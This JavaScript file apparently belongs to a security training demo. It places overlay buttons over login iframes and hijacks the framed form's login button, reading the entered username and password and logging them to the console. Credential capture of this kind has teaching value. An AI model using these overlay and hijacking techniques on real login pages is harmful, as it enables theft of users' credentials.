// index.js
// Copyright © 2018 Joel Mussman. All rights reserved.
//

(() => {

    window.addEventListener('load', () => {

        overlay('login-frame-2', 'iframe-overlay-2', 'button-overlay-2')

        hijack('login-frame-3')

        overlay('login-frame-4', 'iframe-overlay-4', 'button-overlay-4')
    })

    function overlay(frameId, overlayId, buttonId) {

        let iframe = document.getElementById(frameId)
        let frameOverlay = document.getElementById(overlayId)
        let buttonOverlay = document.getElementById(buttonId)

        // Overlay the iframe, accounting for the border around it.

        frameOverlay.style.left = `${iframe.offsetLeft}px`
        frameOverlay.style.top = `${iframe.offsetTop + 70}px`
        frameOverlay.style.width = `${iframe.clientWidth}px`
        frameOverlay.style.height = '21px'

        // This position was calculated by examining the content of the iframe and
        // adjusting for the border drawn around it in the document.

        buttonOverlay.style.left = '110px'  // -4px to compensate for the overlay border we are showing
        buttonOverlay.style.top = '-2px' // -2px to compensate for the overlay border we are showing
        buttonOverlay.style.width = '56px' // +2 to compensate for the overlay border we are showing
        buttonOverlay.style.height = '25px' // +2 to compensate for the overlay border we are showing

        // Add the click handler for the overlay button, which invokes the button in the frame.

        buttonOverlay.addEventListener('click', (event) => {

            let doc = iframe.contentDocument || iframe.contentWindow.document
            let username = doc.getElementsByName('username')[0]
            let password = doc.getElementsByName('password')[0]
            let button = doc.getElementById('login')

            console.log(`index.js (${frameId}): username = "${username.value}"`)
            console.log(`index.js (${frameId}): password = "${password.value}"`)
            button.click()
        })
    }

    function hijack(frameId) {

        let iframe = document.getElementById(frameId)
        let doc = iframe.contentDocument || iframe.contentWindow.document
        let username = doc.getElementsByName('username')[0]
        let password = doc.getElementsByName('password')[0]
        let button = doc.getElementById('login')

        button.addEventListener('click', (event) => {

            console.log(`index.js (${frameId}): username = "${username.value}"`)
            console.log(`index.js (${frameId}): password = "${password.value}"`)
        })
    }

}).call(this)